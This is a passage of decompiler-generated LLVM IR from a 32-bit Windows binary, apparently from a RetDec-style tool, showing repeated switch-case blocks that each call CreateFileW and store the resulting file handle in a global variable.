  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %323, align 4, !insn.addr !1078
  %324 = add i32 %esp.3.reload, -40, !insn.addr !1079
  %325 = inttoptr i32 %324 to i32*, !insn.addr !1079
  store i32 2, i32* %325, align 4, !insn.addr !1079
  %326 = add i32 %esp.3.reload, -44, !insn.addr !1080
  %327 = inttoptr i32 %326 to i32*, !insn.addr !1080
  store i32 ptrtoint (i32* @global_var_10038248 to i32), i32* %327, align 4, !insn.addr !1080
  store i32 %319, i32* @global_var_1003d9c0, align 4, !insn.addr !1081
  %328 = add i32 %esp.3.reload, -48, !insn.addr !1082
  %329 = inttoptr i32 %328 to i32*, !insn.addr !1082
  store i32 %319, i32* %329, align 4, !insn.addr !1082
  store i32 %328, i32* %esp.5.reg2mem, !insn.addr !1083
  br label %dec_label_pc_10003425, !insn.addr !1083

dec_label_pc_10002e53:                            ; preds = %dec_label_pc_10002bc4
  %330 = call i32 @function_10002600(), !insn.addr !1084
  store i32 185, i32* %.pre-phi.reg2mem, !insn.addr !1085
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1085
  br label %dec_label_pc_1000342f, !insn.addr !1085

dec_label_pc_10002e62:                            ; preds = %dec_label_pc_10002bc4
  %331 = add i32 %esp.3.reload, -4, !insn.addr !1086
  %332 = inttoptr i32 %331 to i32*, !insn.addr !1086
  store i32 0, i32* %332, align 4, !insn.addr !1086
  %333 = add i32 %esp.3.reload, -8, !insn.addr !1087
  %334 = inttoptr i32 %333 to i32*, !insn.addr !1087
  store i32 128, i32* %334, align 4, !insn.addr !1087
  %335 = add i32 %esp.3.reload, -12, !insn.addr !1088
  %336 = inttoptr i32 %335 to i32*, !insn.addr !1088
  store i32 4, i32* %336, align 4, !insn.addr !1088
  %337 = add i32 %esp.3.reload, -16, !insn.addr !1089
  %338 = inttoptr i32 %337 to i32*, !insn.addr !1089
  store i32 0, i32* %338, align 4, !insn.addr !1089
  %339 = add i32 %esp.3.reload, -20, !insn.addr !1090
  %340 = inttoptr i32 %339 to i32*, !insn.addr !1090
  store i32 1, i32* %340, align 4, !insn.addr !1090
  %341 = add i32 %esp.3.reload, -24, !insn.addr !1091
  %342 = inttoptr i32 %341 to i32*, !insn.addr !1091
  store i32 4, i32* %342, align 4, !insn.addr !1091
  %343 = add i32 %esp.3.reload, -28, !insn.addr !1092
  %344 = inttoptr i32 %343 to i32*, !insn.addr !1092
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %344, align 4, !insn.addr !1092
  %345 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1093
  %346 = ptrtoint i32* %345 to i32, !insn.addr !1093
  %347 = add i32 %esp.3.reload, -32, !insn.addr !1094
  %348 = inttoptr i32 %347 to i32*, !insn.addr !1094
  store i32 0, i32* %348, align 4, !insn.addr !1094
  %349 = add i32 %esp.3.reload, -36, !insn.addr !1095
  %350 = inttoptr i32 %349 to i32*, !insn.addr !1095
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %350, align 4, !insn.addr !1095
  %351 = add i32 %esp.3.reload, -40, !insn.addr !1096
  %352 = inttoptr i32 %351 to i32*, !insn.addr !1096
  store i32 2, i32* %352, align 4, !insn.addr !1096
  %353 = add i32 %esp.3.reload, -44, !insn.addr !1097
  %354 = inttoptr i32 %353 to i32*, !insn.addr !1097
  store i32 ptrtoint (i32* @global_var_1003824c to i32), i32* %354, align 4, !insn.addr !1097
  store i32 %346, i32* @global_var_1003d9c0, align 4, !insn.addr !1098
  %355 = add i32 %esp.3.reload, -48, !insn.addr !1099
  %356 = inttoptr i32 %355 to i32*, !insn.addr !1099
  store i32 %346, i32* %356, align 4, !insn.addr !1099
  store i32 %355, i32* %esp.5.reg2mem, !insn.addr !1100
  br label %dec_label_pc_10003425, !insn.addr !1100

dec_label_pc_10002e91:                            ; preds = %dec_label_pc_10002bc4
  %357 = call i32 @function_10002600(), !insn.addr !1101
  store i32 187, i32* %.pre-phi.reg2mem, !insn.addr !1102
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1102
  br label %dec_label_pc_1000342f, !insn.addr !1102

dec_label_pc_10002ea0:                            ; preds = %dec_label_pc_10002bc4
  %358 = add i32 %esp.3.reload, -4, !insn.addr !1103
  %359 = inttoptr i32 %358 to i32*, !insn.addr !1103
  store i32 0, i32* %359, align 4, !insn.addr !1103
  %360 = add i32 %esp.3.reload, -8, !insn.addr !1104
  %361 = inttoptr i32 %360 to i32*, !insn.addr !1104
  store i32 128, i32* %361, align 4, !insn.addr !1104
  %362 = add i32 %esp.3.reload, -12, !insn.addr !1105
  %363 = inttoptr i32 %362 to i32*, !insn.addr !1105
  store i32 4, i32* %363, align 4, !insn.addr !1105
  %364 = add i32 %esp.3.reload, -16, !insn.addr !1106
  %365 = inttoptr i32 %364 to i32*, !insn.addr !1106
  store i32 0, i32* %365, align 4, !insn.addr !1106
  %366 = add i32 %esp.3.reload, -20, !insn.addr !1107
  %367 = inttoptr i32 %366 to i32*, !insn.addr !1107
  store i32 1, i32* %367, align 4, !insn.addr !1107
  %368 = add i32 %esp.3.reload, -24, !insn.addr !1108
  %369 = inttoptr i32 %368 to i32*, !insn.addr !1108
  store i32 4, i32* %369, align 4, !insn.addr !1108
  %370 = add i32 %esp.3.reload, -28, !insn.addr !1109
  %371 = inttoptr i32 %370 to i32*, !insn.addr !1109
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %371, align 4, !insn.addr !1109
  %372 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1110
  %373 = ptrtoint i32* %372 to i32, !insn.addr !1110
  %374 = add i32 %esp.3.reload, -32, !insn.addr !1111
  %375 = inttoptr i32 %374 to i32*, !insn.addr !1111
  store i32 0, i32* %375, align 4, !insn.addr !1111
  %376 = add i32 %esp.3.reload, -36, !insn.addr !1112
  %377 = inttoptr i32 %376 to i32*, !insn.addr !1112
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %377, align 4, !insn.addr !1112
  %378 = add i32 %esp.3.reload, -40, !insn.addr !1113
  %379 = inttoptr i32 %378 to i32*, !insn.addr !1113
  store i32 2, i32* %379, align 4, !insn.addr !1113
  %380 = add i32 %esp.3.reload, -44, !insn.addr !1114
  %381 = inttoptr i32 %380 to i32*, !insn.addr !1114
  store i32 ptrtoint (i32* @global_var_10038250 to i32), i32* %381, align 4, !insn.addr !1114
  store i32 %373, i32* @global_var_1003d9c0, align 4, !insn.addr !1115
  %382 = add i32 %esp.3.reload, -48, !insn.addr !1116
  %383 = inttoptr i32 %382 to i32*, !insn.addr !1116
  store i32 %373, i32* %383, align 4, !insn.addr !1116
  store i32 %382, i32* %esp.5.reg2mem, !insn.addr !1117
  br label %dec_label_pc_10003425, !insn.addr !1117

dec_label_pc_10002ecf:                            ; preds = %dec_label_pc_10002bc4
  %384 = add i32 %esp.3.reload, -4, !insn.addr !1118
  %385 = inttoptr i32 %384 to i32*, !insn.addr !1118
  store i32 0, i32* %385, align 4, !insn.addr !1118
  %386 = add i32 %esp.3.reload, -8, !insn.addr !1119
  %387 = inttoptr i32 %386 to i32*, !insn.addr !1119
  store i32 128, i32* %387, align 4, !insn.addr !1119
  %388 = add i32 %esp.3.reload, -12, !insn.addr !1120
  %389 = inttoptr i32 %388 to i32*, !insn.addr !1120
  store i32 4, i32* %389, align 4, !insn.addr !1120
  %390 = add i32 %esp.3.reload, -16, !insn.addr !1121
  %391 = inttoptr i32 %390 to i32*, !insn.addr !1121
  store i32 0, i32* %391, align 4, !insn.addr !1121
  %392 = add i32 %esp.3.reload, -20, !insn.addr !1122
  %393 = inttoptr i32 %392 to i32*, !insn.addr !1122
  store i32 1, i32* %393, align 4, !insn.addr !1122
  %394 = add i32 %esp.3.reload, -24, !insn.addr !1123
  %395 = inttoptr i32 %394 to i32*, !insn.addr !1123
  store i32 4, i32* %395, align 4, !insn.addr !1123
  %396 = add i32 %esp.3.reload, -28, !insn.addr !1124
  %397 = inttoptr i32 %396 to i32*, !insn.addr !1124
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %397, align 4, !insn.addr !1124
  %398 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1125
  %399 = ptrtoint i32* %398 to i32, !insn.addr !1125
  %400 = add i32 %esp.3.reload, -32, !insn.addr !1126
  %401 = inttoptr i32 %400 to i32*, !insn.addr !1126
  store i32 0, i32* %401, align 4, !insn.addr !1126
  %402 = add i32 %esp.3.reload, -36, !insn.addr !1127
  %403 = inttoptr i32 %402 to i32*, !insn.addr !1127
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %403, align 4, !insn.addr !1127
  %404 = add i32 %esp.3.reload, -40, !insn.addr !1128
  %405 = inttoptr i32 %404 to i32*, !insn.addr !1128
  store i32 2, i32* %405, align 4, !insn.addr !1128
  %406 = add i32 %esp.3.reload, -44, !insn.addr !1129
  %407 = inttoptr i32 %406 to i32*, !insn.addr !1129
  store i32 ptrtoint (i32* @global_var_10038254 to i32), i32* %407, align 4, !insn.addr !1129
  store i32 %399, i32* @global_var_1003d9c0, align 4, !insn.addr !1130
  %408 = add i32 %esp.3.reload, -48, !insn.addr !1131
  %409 = inttoptr i32 %408 to i32*, !insn.addr !1131
  store i32 %399, i32* %409, align 4, !insn.addr !1131
  store i32 %408, i32* %esp.5.reg2mem, !insn.addr !1132
  br label %dec_label_pc_10003425, !insn.addr !1132

dec_label_pc_10002efe:                            ; preds = %dec_label_pc_10002bc4, %dec_label_pc_10002bc4, %dec_label_pc_10002bc4
  %410 = add i32 %esp.3.reload, -4, !insn.addr !1133
  %411 = inttoptr i32 %410 to i32*, !insn.addr !1133
  store i32 0, i32* %411, align 4, !insn.addr !1133
  %412 = add i32 %esp.3.reload, -8, !insn.addr !1134
  %413 = inttoptr i32 %412 to i32*, !insn.addr !1134
  store i32 128, i32* %413, align 4, !insn.addr !1134
  %414 = add i32 %esp.3.reload, -12, !insn.addr !1135
  %415 = inttoptr i32 %414 to i32*, !insn.addr !1135
  store i32 4, i32* %415, align 4, !insn.addr !1135
  %416 = add i32 %esp.3.reload, -16, !insn.addr !1136
  %417 = inttoptr i32 %416 to i32*, !insn.addr !1136
  store i32 0, i32* %417, align 4, !insn.addr !1136
  %418 = add i32 %esp.3.reload, -20, !insn.addr !1137
  %419 = inttoptr i32 %418 to i32*, !insn.addr !1137
  store i32 1, i32* %419, align 4, !insn.addr !1137
  %420 = add i32 %esp.3.reload, -24, !insn.addr !1138
  %421 = inttoptr i32 %420 to i32*, !insn.addr !1138
  store i32 4, i32* %421, align 4, !insn.addr !1138
  %422 = add i32 %esp.3.reload, -28, !insn.addr !1139
  %423 = inttoptr i32 %422 to i32*, !insn.addr !1139
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %423, align 4, !insn.addr !1139
  %424 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1140
  %425 = ptrtoint i32* %424 to i32, !insn.addr !1140
  %426 = add i32 %esp.3.reload, -32, !insn.addr !1141
  %427 = inttoptr i32 %426 to i32*, !insn.addr !1141
  store i32 0, i32* %427, align 4, !insn.addr !1141
  %428 = add i32 %esp.3.reload, -36, !insn.addr !1142
  %429 = inttoptr i32 %428 to i32*, !insn.addr !1142
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %429, align 4, !insn.addr !1142
  %430 = add i32 %esp.3.reload, -40, !insn.addr !1143
  %431 = inttoptr i32 %430 to i32*, !insn.addr !1143
  store i32 2, i32* %431, align 4, !insn.addr !1143
  %432 = add i32 %esp.3.reload, -44, !insn.addr !1144
  %433 = inttoptr i32 %432 to i32*, !insn.addr !1144
  store i32 ptrtoint (i32* @global_var_10038258 to i32), i32* %433, align 4, !insn.addr !1144
  store i32 %425, i32* @global_var_1003d9c0, align 4, !insn.addr !1145
  %434 = add i32 %esp.3.reload, -48, !insn.addr !1146
  %435 = inttoptr i32 %434 to i32*, !insn.addr !1146
  store i32 %425, i32* %435, align 4, !insn.addr !1146
  store i32 %434, i32* %esp.5.reg2mem, !insn.addr !1147
  br label %dec_label_pc_10003425, !insn.addr !1147

dec_label_pc_10002f2d:                            ; preds = %dec_label_pc_10002bc4
  %436 = add i32 %esp.3.reload, -4, !insn.addr !1148
  %437 = inttoptr i32 %436 to i32*, !insn.addr !1148
  store i32 0, i32* %437, align 4, !insn.addr !1148
  %438 = add i32 %esp.3.reload, -8, !insn.addr !1149
  %439 = inttoptr i32 %438 to i32*, !insn.addr !1149
  store i32 128, i32* %439, align 4, !insn.addr !1149
  %440 = add i32 %esp.3.reload, -12, !insn.addr !1150
  %441 = inttoptr i32 %440 to i32*, !insn.addr !1150
  store i32 4, i32* %441, align 4, !insn.addr !1150
  %442 = add i32 %esp.3.reload, -16, !insn.addr !1151
  %443 = inttoptr i32 %442 to i32*, !insn.addr !1151
  store i32 0, i32* %443, align 4, !insn.addr !1151
  %444 = add i32 %esp.3.reload, -20, !insn.addr !1152
  %445 = inttoptr i32 %444 to i32*, !insn.addr !1152
  store i32 1, i32* %445, align 4, !insn.addr !1152
  %446 = add i32 %esp.3.reload, -24, !insn.addr !1153
  %447 = inttoptr i32 %446 to i32*, !insn.addr !1153
  store i32 4, i32* %447, align 4, !insn.addr !1153
  %448 = add i32 %esp.3.reload, -28, !insn.addr !1154
  %449 = inttoptr i32 %448 to i32*, !insn.addr !1154
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %449, align 4, !insn.addr !1154
  %450 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1155
  %451 = ptrtoint i32* %450 to i32, !insn.addr !1155
  %452 = add i32 %esp.3.reload, -32, !insn.addr !1156
  %453 = inttoptr i32 %452 to i32*, !insn.addr !1156
  store i32 0, i32* %453, align 4, !insn.addr !1156
  %454 = add i32 %esp.3.reload, -36, !insn.addr !1157
  %455 = inttoptr i32 %454 to i32*, !insn.addr !1157
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %455, align 4, !insn.addr !1157
  %456 = add i32 %esp.3.reload, -40, !insn.addr !1158
  %457 = inttoptr i32 %456 to i32*, !insn.addr !1158
  store i32 2, i32* %457, align 4, !insn.addr !1158
  %458 = add i32 %esp.3.reload, -44, !insn.addr !1159
  %459 = inttoptr i32 %458 to i32*, !insn.addr !1159
  store i32 ptrtoint (i32* @global_var_1003825c to i32), i32* %459, align 4, !insn.addr !1159
  store i32 %451, i32* @global_var_1003d9c0, align 4, !insn.addr !1160
  %460 = add i32 %esp.3.reload, -48, !insn.addr !1161
  %461 = inttoptr i32 %460 to i32*, !insn.addr !1161
  store i32 %451, i32* %461, align 4, !insn.addr !1161
  store i32 %460, i32* %esp.5.reg2mem, !insn.addr !1162
  br label %dec_label_pc_10003425, !insn.addr !1162

dec_label_pc_10002f5c:                            ; preds = %dec_label_pc_10002bc4
  %462 = add i32 %esp.3.reload, -4, !insn.addr !1163
  %463 = inttoptr i32 %462 to i32*, !insn.addr !1163
  store i32 0, i32* %463, align 4, !insn.addr !1163
  %464 = add i32 %esp.3.reload, -8, !insn.addr !1164
  %465 = inttoptr i32 %464 to i32*, !insn.addr !1164
  store i32 128, i32* %465, align 4, !insn.addr !1164
  %466 = add i32 %esp.3.reload, -12, !insn.addr !1165
  %467 = inttoptr i32 %466 to i32*, !insn.addr !1165
  store i32 4, i32* %467, align 4, !insn.addr !1165
  %468 = add i32 %esp.3.reload, -16, !insn.addr !1166
  %469 = inttoptr i32 %468 to i32*, !insn.addr !1166
  store i32 0, i32* %469, align 4, !insn.addr !1166
  %470 = add i32 %esp.3.reload, -20, !insn.addr !1167
  %471 = inttoptr i32 %470 to i32*, !insn.addr !1167
  store i32 1, i32* %471, align 4, !insn.addr !1167
  %472 = add i32 %esp.3.reload, -24, !insn.addr !1168
  %473 = inttoptr i32 %472 to i32*, !insn.addr !1168
  store i32 4, i32* %473, align 4, !insn.addr !1168
  %474 = add i32 %esp.3.reload, -28, !insn.addr !1169
  %475 = inttoptr i32 %474 to i32*, !insn.addr !1169
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %475, align 4, !insn.addr !1169
  %476 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1170
  %477 = ptrtoint i32* %476 to i32, !insn.addr !1170
  %478 = add i32 %esp.3.reload, -32, !insn.addr !1171
  %479 = inttoptr i32 %478 to i32*, !insn.addr !1171
  store i32 0, i32* %479, align 4, !insn.addr !1171
  %480 = add i32 %esp.3.reload, -36, !insn.addr !1172
  %481 = inttoptr i32 %480 to i32*, !insn.addr !1172
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %481, align 4, !insn.addr !1172
  %482 = add i32 %esp.3.reload, -40, !insn.addr !1173
  %483 = inttoptr i32 %482 to i32*, !insn.addr !1173
  store i32 2, i32* %483, align 4, !insn.addr !1173
  %484 = add i32 %esp.3.reload, -44, !insn.addr !1174
  %485 = inttoptr i32 %484 to i32*, !insn.addr !1174
  store i32 ptrtoint (i32* @global_var_10038260 to i32), i32* %485, align 4, !insn.addr !1174
  store i32 %477, i32* @global_var_1003d9c0, align 4, !insn.addr !1175
  %486 = add i32 %esp.3.reload, -48, !insn.addr !1176
  %487 = inttoptr i32 %486 to i32*, !insn.addr !1176
  store i32 %477, i32* %487, align 4, !insn.addr !1176
  store i32 %486, i32* %esp.5.reg2mem, !insn.addr !1177
  br label %dec_label_pc_10003425, !insn.addr !1177

dec_label_pc_10002f8b:                            ; preds = %dec_label_pc_10002bc4
  %488 = add i32 %esp.3.reload, -4, !insn.addr !1178
  %489 = inttoptr i32 %488 to i32*, !insn.addr !1178
  store i32 0, i32* %489, align 4, !insn.addr !1178
  %490 = add i32 %esp.3.reload, -8, !insn.addr !1179
  %491 = inttoptr i32 %490 to i32*, !insn.addr !1179
  store i32 128, i32* %491, align 4, !insn.addr !1179
  %492 = add i32 %esp.3.reload, -12, !insn.addr !1180
  %493 = inttoptr i32 %492 to i32*, !insn.addr !1180
  store i32 4, i32* %493, align 4, !insn.addr !1180
  %494 = add i32 %esp.3.reload, -16, !insn.addr !1181
  %495 = inttoptr i32 %494 to i32*, !insn.addr !1181
  store i32 0, i32* %495, align 4, !insn.addr !1181
  %496 = add i32 %esp.3.reload, -20, !insn.addr !1182
  %497 = inttoptr i32 %496 to i32*, !insn.addr !1182
  store i32 1, i32* %497, align 4, !insn.addr !1182
  %498 = add i32 %esp.3.reload, -24, !insn.addr !1183
  %499 = inttoptr i32 %498 to i32*, !insn.addr !1183
  store i32 4, i32* %499, align 4, !insn.addr !1183
  %500 = add i32 %esp.3.reload, -28, !insn.addr !1184
  %501 = inttoptr i32 %500 to i32*, !insn.addr !1184
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %501, align 4, !insn.addr !1184
  %502 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1185
  %503 = ptrtoint i32* %502 to i32, !insn.addr !1185
  %504 = add i32 %esp.3.reload, -32, !insn.addr !1186
  %505 = inttoptr i32 %504 to i32*, !insn.addr !1186
  store i32 0, i32* %505, align 4, !insn.addr !1186
  %506 = add i32 %esp.3.reload, -36, !insn.addr !1187
  %507 = inttoptr i32 %506 to i32*, !insn.addr !1187
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %507, align 4, !insn.addr !1187
  %508 = add i32 %esp.3.reload, -40, !insn.addr !1188
  %509 = inttoptr i32 %508 to i32*, !insn.addr !1188
  store i32 2, i32* %509, align 4, !insn.addr !1188
  %510 = add i32 %esp.3.reload, -44, !insn.addr !1189
  %511 = inttoptr i32 %510 to i32*, !insn.addr !1189
  store i32 ptrtoint (i32* @global_var_10038264 to i32), i32* %511, align 4, !insn.addr !1189
  store i32 %503, i32* @global_var_1003d9c0, align 4, !insn.addr !1190
  %512 = add i32 %esp.3.reload, -48, !insn.addr !1191
  %513 = inttoptr i32 %512 to i32*, !insn.addr !1191
  store i32 %503, i32* %513, align 4, !insn.addr !1191
  store i32 %512, i32* %esp.5.reg2mem, !insn.addr !1192
  br label %dec_label_pc_10003425, !insn.addr !1192

dec_label_pc_10002fba:                            ; preds = %dec_label_pc_10002bc4
  %514 = add i32 %esp.3.reload, -4, !insn.addr !1193
  %515 = inttoptr i32 %514 to i32*, !insn.addr !1193
  store i32 0, i32* %515, align 4, !insn.addr !1193
  %516 = add i32 %esp.3.reload, -8, !insn.addr !1194
  %517 = inttoptr i32 %516 to i32*, !insn.addr !1194
  store i32 128, i32* %517, align 4, !insn.addr !1194
  %518 = add i32 %esp.3.reload, -12, !insn.addr !1195
  %519 = inttoptr i32 %518 to i32*, !insn.addr !1195
  store i32 4, i32* %519, align 4, !insn.addr !1195
  %520 = add i32 %esp.3.reload, -16, !insn.addr !1196
  %521 = inttoptr i32 %520 to i32*, !insn.addr !1196
  store i32 0, i32* %521, align 4, !insn.addr !1196
  %522 = add i32 %esp.3.reload, -20, !insn.addr !1197
  %523 = inttoptr i32 %522 to i32*, !insn.addr !1197
  store i32 1, i32* %523, align 4, !insn.addr !1197
  %524 = add i32 %esp.3.reload, -24, !insn.addr !1198
  %525 = inttoptr i32 %524 to i32*, !insn.addr !1198
  store i32 4, i32* %525, align 4, !insn.addr !1198
  %526 = add i32 %esp.3.reload, -28, !insn.addr !1199
  %527 = inttoptr i32 %526 to i32*, !insn.addr !1199
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %527, align 4, !insn.addr !1199
  %528 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1200
  %529 = ptrtoint i32* %528 to i32, !insn.addr !1200
  %530 = add i32 %esp.3.reload, -32, !insn.addr !1201
  %531 = inttoptr i32 %530 to i32*, !insn.addr !1201
  store i32 0, i32* %531, align 4, !insn.addr !1201
  %532 = add i32 %esp.3.reload, -36, !insn.addr !1202
  %533 = inttoptr i32 %532 to i32*, !insn.addr !1202
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %533, align 4, !insn.addr !1202
  %534 = add i32 %esp.3.reload, -40, !insn.addr !1203
  %535 = inttoptr i32 %534 to i32*, !insn.addr !1203
  store i32 2, i32* %535, align 4, !insn.addr !1203
  %536 = add i32 %esp.3.reload, -44, !insn.addr !1204
  %537 = inttoptr i32 %536 to i32*, !insn.addr !1204
  store i32 ptrtoint (i32* @global_var_10038268 to i32), i32* %537, align 4, !insn.addr !1204
  store i32 %529, i32* @global_var_1003d9c0, align 4, !insn.addr !1205
  %538 = add i32 %esp.3.reload, -48, !insn.addr !1206
  %539 = inttoptr i32 %538 to i32*, !insn.addr !1206
  store i32 %529, i32* %539, align 4, !insn.addr !1206
  store i32 %538, i32* %esp.5.reg2mem, !insn.addr !1207
  br label %dec_label_pc_10003425, !insn.addr !1207

dec_label_pc_10002fe9:                            ; preds = %dec_label_pc_10002bc4, %dec_label_pc_10002bc4
  %540 = add i32 %esp.3.reload, -4, !insn.addr !1208
  %541 = inttoptr i32 %540 to i32*, !insn.addr !1208
  store i32 0, i32* %541, align 4, !insn.addr !1208
  %542 = add i32 %esp.3.reload, -8, !insn.addr !1209
  %543 = inttoptr i32 %542 to i32*, !insn.addr !1209
  store i32 128, i32* %543, align 4, !insn.addr !1209
  %544 = add i32 %esp.3.reload, -12, !insn.addr !1210
  %545 = inttoptr i32 %544 to i32*, !insn.addr !1210
  store i32 4, i32* %545, align 4, !insn.addr !1210
  %546 = add i32 %esp.3.reload, -16, !insn.addr !1211
  %547 = inttoptr i32 %546 to i32*, !insn.addr !1211
  store i32 0, i32* %547, align 4, !insn.addr !1211
  %548 = add i32 %esp.3.reload, -20, !insn.addr !1212
  %549 = inttoptr i32 %548 to i32*, !insn.addr !1212
  store i32 1, i32* %549, align 4, !insn.addr !1212
  %550 = add i32 %esp.3.reload, -24, !insn.addr !1213
  %551 = inttoptr i32 %550 to i32*, !insn.addr !1213
  store i32 4, i32* %551, align 4, !insn.addr !1213
  %552 = add i32 %esp.3.reload, -28, !insn.addr !1214
  %553 = inttoptr i32 %552 to i32*, !insn.addr !1214
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %553, align 4, !insn.addr !1214
  %554 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1215
  %555 = ptrtoint i32* %554 to i32, !insn.addr !1215
  %556 = add i32 %esp.3.reload, -32, !insn.addr !1216
  %557 = inttoptr i32 %556 to i32*, !insn.addr !1216
  store i32 0, i32* %557, align 4, !insn.addr !1216
  %558 = add i32 %esp.3.reload, -36, !insn.addr !1217
  %559 = inttoptr i32 %558 to i32*, !insn.addr !1217
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %559, align 4, !insn.addr !1217
  %560 = add i32 %esp.3.reload, -40, !insn.addr !1218
  %561 = inttoptr i32 %560 to i32*, !insn.addr !1218
  store i32 2, i32* %561, align 4, !insn.addr !1218
  %562 = add i32 %esp.3.reload, -44, !insn.addr !1219
  %563 = inttoptr i32 %562 to i32*, !insn.addr !1219
  store i32 ptrtoint (i32* @global_var_1003826c to i32), i32* %563, align 4, !insn.addr !1219
  store i32 %555, i32* @global_var_1003d9c0, align 4, !insn.addr !1220
  %564 = add i32 %esp.3.reload, -48, !insn.addr !1221
  %565 = inttoptr i32 %564 to i32*, !insn.addr !1221
  store i32 %555, i32* %565, align 4, !insn.addr !1221
  store i32 %564, i32* %esp.5.reg2mem, !insn.addr !1222
  br label %dec_label_pc_10003425, !insn.addr !1222

dec_label_pc_10003018:                            ; preds = %dec_label_pc_10002bc4
  %566 = add i32 %esp.3.reload, -4, !insn.addr !1223
  %567 = inttoptr i32 %566 to i32*, !insn.addr !1223
  store i32 0, i32* %567, align 4, !insn.addr !1223
  %568 = add i32 %esp.3.reload, -8, !insn.addr !1224
  %569 = inttoptr i32 %568 to i32*, !insn.addr !1224
  store i32 128, i32* %569, align 4, !insn.addr !1224
  %570 = add i32 %esp.3.reload, -12, !insn.addr !1225
  %571 = inttoptr i32 %570 to i32*, !insn.addr !1225
  store i32 4, i32* %571, align 4, !insn.addr !1225
  %572 = add i32 %esp.3.reload, -16, !insn.addr !1226
  %573 = inttoptr i32 %572 to i32*, !insn.addr !1226
  store i32 0, i32* %573, align 4, !insn.addr !1226
  %574 = add i32 %esp.3.reload, -20, !insn.addr !1227
  %575 = inttoptr i32 %574 to i32*, !insn.addr !1227
  store i32 1, i32* %575, align 4, !insn.addr !1227
  %576 = add i32 %esp.3.reload, -24, !insn.addr !1228
  %577 = inttoptr i32 %576 to i32*, !insn.addr !1228
  store i32 4, i32* %577, align 4, !insn.addr !1228
  %578 = add i32 %esp.3.reload, -28, !insn.addr !1229
  %579 = inttoptr i32 %578 to i32*, !insn.addr !1229
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %579, align 4, !insn.addr !1229
  %580 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1230
